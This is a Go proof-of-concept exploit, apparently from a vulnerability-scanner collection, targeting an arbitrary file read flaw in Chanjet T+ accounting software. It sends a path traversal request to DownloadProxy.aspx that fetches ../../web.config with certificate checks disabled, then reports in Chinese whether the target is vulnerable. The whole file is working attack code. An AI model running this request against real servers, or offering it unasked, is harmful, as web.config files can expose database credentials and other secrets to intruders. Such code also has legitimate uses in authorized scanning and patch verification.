package poc

import (
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
)

func DownloadProxyReadfile(target string) {
	urlPath := strings.TrimRight(target, "/")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	req, err := http.NewRequest("GET", urlPath+"/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../web.config", nil)
	if err != nil {
		log.Println("[-] Failed to create request:", err)
		return
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println(err)
		return
	}
	reg := regexp.MustCompile("xml version=\"1.0\"")
	msg := reg.MatchString(string(body))
	if resp.StatusCode == http.StatusOK && msg {
		log.Println("[+] 存在畅捷通T+任意文件读取漏洞：" + urlPath + "/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=")
	} else {
		log.Println("[-] 不存在畅捷通T+任意文件读取漏洞")
	}

}
